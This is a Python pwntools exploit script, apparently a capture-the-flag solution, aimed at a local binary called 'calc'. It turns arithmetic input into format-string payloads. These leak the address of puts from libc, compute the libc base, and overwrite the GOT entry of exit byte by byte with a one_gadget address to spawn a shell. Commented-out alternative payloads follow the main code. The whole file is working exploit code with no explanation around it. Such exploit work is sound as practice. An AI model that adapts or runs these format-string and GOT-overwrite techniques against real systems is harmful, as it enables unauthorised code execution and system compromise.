from pwn import *
import struct
context.log_level = 'debug'

p=process('./calc')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
puts_got =0x602018
gadget=[0x45216,0x4526a,0xf02a4,0xf1147]

#gdb.attach(p,'b *0x401023')

exit_got = 0x602048

def input_data(data):
	p.sendafter('Your input:\n',data+'\n')

def contin(c):
	p.sendafter('continue? Y:N\n',c)

def fmt2int(a):#a is fmtstr
	payload=''
	total = 1
	for i in range(len(a)/8):
		num = struct.unpack('q',a[8*i:8*(i+1)])[0]
		print hex(num)
		total+=num
		payload+='+'+ str(num)
	tmp='0x'
	for j in range(len(a)-1,8*(i+1)-1,-1):
		tmp+=hex(ord(a[j]))[2:]
	num = int(tmp,16)
	print hex(num)
	total += num
	payload +='+'+str(num)	
	return (payload,total)

def fmt(value):
	for i in range(8):
		payload='+'*30+'+1'
		if (value >> (8*i))==0:
			break
		write_byte = (value >> (8*i)) & 0xff
		fmtstr = '%{0}c%1$hhn\n'.format(write_byte)
		(toint,total) =fmt2int(fmtstr)
		payload +=toint
		print total
		
		other = exit_got+i-total
		if (other >=0):
			payload+='+'+str(other)
		else:
			payload+='-'+str(0-other)
		print payload
		input_data(payload)
		if i<5:
			contin('Y')
		else:
			contin('N')




input_data('+'*30+'+1+684837+5614834')#684837:%s\n;684837+5614834=0x602018

puts_addr = u64(p.recvline()[:-1].ljust(8,'\x00'))
log.info("puts_addr:%#x",puts_addr)
libc_base = puts_addr - libc.symbols['puts']

contin('Y')
fmt(libc_base+gadget[3])



'''
payload='+'
payload+=str(libc_base+gadget[0])#write to 0x6020a0+32+8
payload+='+'*30
payload+='+3473463031033378341+2936160510289251+1'#3473463031033378341:'0x3034383939323625';2936160510289251:0xa6e6c24382563
input(payload,0)
'''
'''
payload ='+'*30+'+1'
payload+='+2694056587054822437+44801991736+'#44801991736:8$n\n;2694056587054822437:%44416c%
payload = payload.ljust(48,'0')
payload+='+'*8
payload+=str(libc_base+gadget[0])
input(payload,0)
'''
p.interactive()
